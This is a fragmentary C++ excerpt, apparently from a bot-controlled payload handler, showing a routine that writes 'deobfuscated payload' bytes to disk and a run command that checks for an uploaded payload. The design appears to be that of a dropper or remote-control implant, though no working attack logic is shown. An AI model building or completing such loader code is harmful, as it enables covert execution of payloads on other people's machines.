...
_writePayloadIntoFilesystem(const std::vector<uint8_t>& Payload_Bytes) {
	...
	const auto& payload_path = std::filesystem::current_path() / std::filesystem::path(payload_name);
    ...
    try {
        ...
        HANDLER_DEBUG_LOG("Writing deobfuscated payload bytes into the file system {}", payload_path.string());
        ...
        HANDLER_ERROR_LOG("Failed at writing the deobfuscated payload into the file system {}: {}", payload_path.string(), e.what());
...
void Handler::handleRunCommand() {
	{
		if(this->state.payload.size() == 0) {
			this->bot->sendMessage("There is no payload to run upload one ");
			return;
		}
